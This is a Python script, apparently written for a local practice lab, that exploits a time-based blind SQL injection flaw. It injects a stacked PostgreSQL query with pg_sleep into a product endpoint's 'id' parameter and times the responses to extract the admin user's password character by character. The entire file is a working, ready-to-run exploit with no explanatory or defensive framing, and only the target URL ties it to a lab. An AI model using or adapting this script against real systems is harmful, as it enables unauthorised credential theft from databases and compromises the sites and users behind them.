#!/usr/bin/env python3
import requests
import time
import string

BASE_URL = "http://localhost:8082/blind/product"
SLEEP_TIME = 3.0
THRESHOLD = 2.0  

def check_condition(position, char):
    inj = f"1; SELECT CASE WHEN (SUBSTRING(password,{position},1)='{char}') THEN pg_sleep({SLEEP_TIME}) ELSE pg_sleep(0) END FROM users WHERE username='admin'--"
    params = {"id": inj}
    start = time.time()
    try:
        requests.get(BASE_URL, params=params, timeout=SLEEP_TIME + 2)
    except requests.exceptions.ReadTimeout:
        return True
    elapsed = time.time() - start
    return elapsed > THRESHOLD

def extract_password(max_len=32):
    charset = string.ascii_letters + string.digits + "_-!@#"
    guessed = ""
    for pos in range(1, max_len + 1):
        found = False
        for ch in charset:
            print(f"[*] Testing position {pos} char {ch}")
            if check_condition(pos, ch):
                guessed += ch
                print(f"[+] Position {pos}: {ch}")
                found = True
                break
        if not found:
            break
    return guessed

if __name__ == "__main__":
    print("[*] Extracting admin password using time-based blind SQLi")
    pwd = extract_password()
    print(f"[+] Recovered password: {pwd}")
